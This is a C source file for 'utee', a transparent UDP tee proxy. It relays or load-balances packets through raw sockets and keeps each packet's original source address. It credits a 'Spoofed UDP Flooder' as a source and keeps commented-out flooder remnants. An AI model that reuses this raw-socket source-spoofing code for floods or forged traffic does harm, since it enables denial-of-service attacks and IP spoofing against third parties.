/* utee - transparent udp tee proxy
 *
 * support for:
 *  * round-robin load-balance
 *  * duplicate/relay
 *
 * based on:
 *  * http://pastebin.com/CG8zscaA (Spoofed UDP Flooder v2.5.3 FINAL by ohnoes1479)
 *  * http://beej.us/guide/bgnet/
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <pthread.h>
#include <sys/select.h>
#include <time.h>

#define BUFLEN 4096
#define MAXTHREADS 1024

struct statistics {
    uint64_t bytecnt;
};

struct s_features {
    uint8_t load_balance;
    uint8_t duplicate;
};

struct thread_data {
    int thread_id;
    int sockfd;
    struct sockaddr_in* targets;
    uint32_t num_targets;
    struct statistics stats;
    struct s_features features;
};

char *myStrCat (char *s, char *a) {
    while (*s != '\0') s++;
    while (*a != '\0') *s++ = *a++;
    *s = '\0';
    return s;
}

char *replStr (char *str, size_t count) {
    if (count == 0) return NULL;
    char *ret = malloc (strlen (str) * count + count);
    if (ret == NULL) return NULL;
    *ret = '\0';
    char *tmp = myStrCat (ret, str);
    while (--count > 0) {
        tmp = myStrCat (tmp, str);
    }
    return ret;
}

unsigned short csum (unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// get sockaddr, IPv4 or IPv6:
void *get_in_addr(struct sockaddr *sa) {
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

void update_ip_header(struct iphdr *iph, uint16_t ip_payload_len,
                      uint32_t saddr, uint32_t daddr) {
  iph->tot_len = sizeof(struct iphdr) + ip_payload_len;
  iph->saddr = saddr;
  iph->daddr = daddr;
}

void setup_ip_header(struct iphdr *iph, uint16_t ip_payload_len,
                     uint32_t saddr, uint32_t daddr) {
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->id = htonl(54321);
  iph->frag_off = 0;
  iph->ttl = MAXTTL;
  iph->protocol = IPPROTO_UDP;
  iph->check = 0;
  // iph->check = csum((unsigned short *) datagram, ntohs(udph->len) >> 1);

  update_ip_header(iph, ip_payload_len, saddr, daddr);
}

void update_udp_header(struct udphdr *udph, uint16_t udp_payload_len,
                       uint16_t source, uint16_t dest) {
    udph->len = htons(sizeof(struct udphdr) + udp_payload_len);
    udph->source = source;
    udph->dest = dest;
}

void setup_udp_header(struct udphdr *udph, uint16_t udp_payload_len,
                      uint16_t source, uint16_t dest) {
    // char *data = (char *)udph + sizeof(struct udphdr);
    // data = replStr("\xFF" "\xFF" "\xFF" "\xFF", 256);
    udph->check = 0;
    update_udp_header(udph, udp_payload_len, source, dest);
}

void *tee(void *arg0) {
    struct thread_data *td = (struct thread_data *)arg0;
    struct s_features *features = &(td->features);
    struct statistics *stats = &(td->stats);

    // incoming packets
    int numbytes = 0;
    struct sockaddr_storage their_addr;
    socklen_t addr_len = sizeof(their_addr);

    // outgoing packets
    char datagram[BUFLEN];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->targets[td->thread_id];

    memset(datagram, 0, BUFLEN);
    // Set appropriate fields in headers
    setup_ip_header(iph, 0, 0, 0);
    setup_udp_header(udph, 0, 0, 0);
    char *data = (char *)udph + sizeof(struct udphdr);

    int ssock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(ssock < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(1);
    }

    while (1) {
        if ((numbytes = recvfrom(td->sockfd, data, BUFLEN-sizeof(struct iphdr)-sizeof(struct udphdr), 0,
            (struct sockaddr *)&their_addr, &addr_len)) == -1) {
            perror("recvfrom");
            exit(1);
        }

        data[numbytes] = '\0';

#ifdef DEBUG
        char addrbuf0[INET6_ADDRSTRLEN];
        char addrbuf1[INET6_ADDRSTRLEN];
        printf("listener %d: got packet from %s\n",
            td->thread_id,
            inet_ntop(their_addr.ss_family,
                get_in_addr((struct sockaddr *)&their_addr),
                addrbuf0, sizeof(addrbuf0)));
        printf("listener %d: packet is %d bytes long\n", td->thread_id, numbytes);
        printf("listener %d: packet contains \"%s\"\n", td->thread_id, data);
        printf("listener %d: crafting new packet...\n", td->thread_id);
#endif

        stats->bytecnt += sizeof(struct iphdr) + sizeof(struct udphdr) + numbytes;

        update_udp_header(udph, numbytes, ((struct sockaddr_in*)&their_addr)->sin_port, sin.sin_port);
        update_ip_header(iph, sizeof(struct udphdr) + numbytes,
                         ((struct sockaddr_in*)&their_addr)->sin_addr.s_addr,
                         sin.sin_addr.s_addr);

#ifdef DEBUG
        printf("listener %d: sending packet: %s:%u => %s:%u: len: %u\n",
            td->thread_id,
            inet_ntop(AF_INET,
                (struct sockaddr_in *)&(iph->saddr),
                addrbuf0, sizeof(addrbuf0)),
            ntohs(udph->source),
            inet_ntop(AF_INET,
                (struct sockaddr_in *)&(iph->daddr),
                addrbuf1, sizeof(addrbuf1)),
            ntohs(udph->dest),
            iph->tot_len);
#endif

        if (sendto(ssock, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        }
    }
}

void *duplicate(void *arg0) {
    struct thread_data *td = (struct thread_data *)arg0;
    struct s_features *features = &(td->features);
    struct statistics *stats = &(td->stats);

    // incoming packets
    int numbytes = 0;
    struct sockaddr_storage their_addr;
    socklen_t addr_len = sizeof(their_addr);

    // outgoing packets
    char datagram[BUFLEN];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
    struct sockaddr_in sin = td->targets[td->thread_id];

    memset(datagram, 0, BUFLEN);
    // Set appropriate fields in headers
    setup_ip_header(iph, 0, 0, 0);
    setup_udp_header(udph, 0, 0, 0);
    char *data = (char *)udph + sizeof(struct udphdr);

    int ssock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(ssock < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(1);
    }

    while (1) {
        if ((numbytes = recvfrom(td->sockfd, data, BUFLEN-sizeof(struct iphdr)-sizeof(struct udphdr), 0,
            (struct sockaddr *)&their_addr, &addr_len)) == -1) {
            perror("recvfrom");
            exit(1);
        }

        data[numbytes] = '\0';

#ifdef DEBUG
        char addrbuf0[INET6_ADDRSTRLEN];
        char addrbuf1[INET6_ADDRSTRLEN];
        printf("listener %d: got packet from %s\n",
            td->thread_id,
            inet_ntop(their_addr.ss_family,
                get_in_addr((struct sockaddr *)&their_addr),
                addrbuf0, sizeof(addrbuf0)));
        printf("listener %d: packet is %d bytes long\n", td->thread_id, numbytes);
        printf("listener %d: packet contains \"%s\"\n", td->thread_id, data);
        printf("listener %d: crafting new packet...\n", td->thread_id);
#endif

        stats->bytecnt += sizeof(struct iphdr) + sizeof(struct udphdr) + numbytes;

        update_udp_header(udph, numbytes, ((struct sockaddr_in*)&their_addr)->sin_port, sin.sin_port);
        update_ip_header(iph, sizeof(struct udphdr) + numbytes,
                         ((struct sockaddr_in*)&their_addr)->sin_addr.s_addr,
                         sin.sin_addr.s_addr);

#ifdef DEBUG
        printf("listener %d: sending packet: %s:%u => %s:%u: len: %u\n",
            td->thread_id,
            inet_ntop(AF_INET,
                (struct sockaddr_in *)&(iph->saddr),
                addrbuf0, sizeof(addrbuf0)),
            ntohs(udph->source),
            inet_ntop(AF_INET,
                (struct sockaddr_in *)&(iph->daddr),
                addrbuf1, sizeof(addrbuf1)),
            ntohs(udph->dest),
            iph->tot_len);
#endif

        if (sendto(ssock, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        }
    }
}

int open_listener_socket(char* laddr, int lport) {
    struct sockaddr_in listener_addr;
    int lsock_option = 1;
    int lsock;

    bzero(&listener_addr, sizeof(listener_addr));
    listener_addr.sin_family = AF_INET;
    listener_addr.sin_port = htons(lport);
    listener_addr.sin_addr.s_addr = inet_addr(laddr);

    if ((lsock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("listener: socket");
        return -1;
    }

    setsockopt(lsock, SOL_SOCKET, SO_REUSEADDR, (void *)&lsock_option, sizeof(lsock_option));

    if (bind(lsock, (struct sockaddr *)&listener_addr, sizeof(listener_addr)) == -1) {
        close(lsock);
        perror("listener: bind");
        return -1;
    }

    return lsock;
}

int split_addr(const char* addr, char* ip, uint16_t* port) {
    char target = ':';
    char *result;

    if ((result = strchr(addr, target)) == NULL)
        return -1;

    memcpy(ip, addr, (result - addr));
    ip[(result - addr)] = '\0';
    *port = atoi(result+1);

    return 0;
}

uint8_t stats_enabled = 0;
uint8_t reset_stats = 0;
uint8_t optional_output_enabled = 0;
uint16_t num_threads = 0;
struct thread_data tds[MAXTHREADS];
struct sockaddr_in targets[MAXTHREADS];


void sig_handler_toggle_stats(int signum) {
  stats_enabled = (!stats_enabled);
  fprintf(stderr, "toggling stats output: %u\n", stats_enabled);
}

void sig_handler_reset_stats(int signum) {
  fprintf(stderr, "resetting stats\n");
  reset_stats = 1;
}

void sig_handler_toggle_optional_output(int signum) {
  uint16_t cnt;

  optional_output_enabled = (!optional_output_enabled);
  fprintf(stderr, "toggling optional output: %u\n", optional_output_enabled);

  for (cnt = 0; cnt < num_threads; cnt++) {
    tds[cnt].features.duplicate = optional_output_enabled;
  }
}

void usage(int argc, char *argv[]) {
    fprintf(stderr, "usage: %s -l <listenaddr:port> -m <r|d> -n <num_threads> <targetaddr:port> [targetaddr:port [...]]\n\tNote: num_threads must be >= number of target addresses", argv[0]);
    abort();
}

int main(int argc, char *argv[]) {

    char listenaddr[INET6_ADDRSTRLEN];
    uint16_t listenport = 0;
    pthread_t thread[MAXTHREADS];
    uint8_t cnt;
    int lsock;

    char addrbuf[INET6_ADDRSTRLEN];
    uint16_t portbuf;

    unsigned char mode = 0xFF;

    time_t now;

    int index;
    int c;

    opterr = 0;
    while ((c = getopt (argc, argv, "l:m:n:")) != -1)
    switch (c) {
        case 'l':
            split_addr(optarg, listenaddr, &listenport);
#ifdef DEBUG
            printf("listen address: %s:%u\n", listenaddr, listenport);
#endif
        break;
        case 'n':
            num_threads = atoi(optarg);
#ifdef DEBUG
            printf("number of threads: %u\n", num_threads);
#endif
        break;
        case 'm':
            switch (*optarg) {
                case 'r':
                    mode = 'r';
#ifdef DEBUG
                    fprintf(stdout, "mode: round-robin\n");
#endif
                break;
                case 'd':
                    mode = 'd';
#ifdef DEBUG
                    fprintf(stdout, "mode: duplicate\n");
#endif
                break;
                default:
                    mode = 255;
#ifdef DEBUG
                    fprintf(stdout, "invalid mode 0x%x\n", mode);
#endif
                    usage(argc, argv);
                break;
            }
        break;
        default:
            usage(argc, argv);
    }
    if (mode == 0xFF || num_threads == 0 || listenport == 0 || (argc - optind > num_threads))
        usage(argc, argv);

    signal(SIGUSR1, sig_handler_toggle_stats);
    signal(SIGALRM, sig_handler_reset_stats);
    signal(SIGUSR2, sig_handler_toggle_optional_output);

#ifdef DEBUG
    fprintf(stdout, "setting up listener socket...\n");
#endif
    lsock = open_listener_socket(listenaddr, listenport);

    bzero(tds, sizeof(tds));
    // this one loops over all threads
    for (cnt = 0; cnt < num_threads; cnt++) {
        tds[cnt].thread_id = cnt;
        tds[cnt].sockfd = lsock;
        tds[cnt].targets = targets;
        tds[cnt].num_targets = argc - optind;
        switch (mode) {
            case 'r':
                tds[cnt].features.load_balance = 1;
            break;
            case 'd':
                tds[cnt].features.duplicate = 1;
            break;
        }
    }

    // set all targets
    index = optind;
    for (cnt = 0; cnt < num_threads; cnt++) {
        split_addr(argv[index++], addrbuf, &portbuf);
        targets[cnt].sin_family = AF_INET;
        targets[cnt].sin_addr.s_addr = inet_addr(addrbuf);
        targets[cnt].sin_port = htons(portbuf);

        if (index >= argc)
            index = optind;

#ifdef DEBUG
        fprintf(stdout, "thread %u: relaying to: %s:%u\n", cnt, addrbuf, portbuf);
#endif
    }

    // this one loops over all threads and starts them
    for (cnt = 0; cnt < num_threads; cnt++) {
        switch (mode) {
            case 'r':
                pthread_create(&thread[cnt], NULL, &tee, (void *) &tds[cnt]);
            break;
            case 'd':
                pthread_create(&thread[cnt], NULL, &duplicate, (void *) &tds[cnt]);
            break;
        }
    }

#ifdef DEBUG
    fprintf(stdout, "starting tee...\n");
#endif

    // main thread is the 'extra' stats-thread. use it to catch/handle signals
    fprintf(stdout, "#ts\tlistener\tbytecnt\n");
    while (1) {
        if (reset_stats) {
            for (cnt = 0; cnt < num_threads; cnt++) {
                tds[cnt].stats.bytecnt = 0;
            }
            reset_stats = 0;
        }
        if (stats_enabled) {
            now = time(0);
            for (cnt = 0; cnt < num_threads; cnt++) {
                fprintf(stdout, "%u\t%u\t%u\n", now, cnt, tds[cnt].stats.bytecnt);
            }
        }

        sleep(1);
    }

    return 0;
}
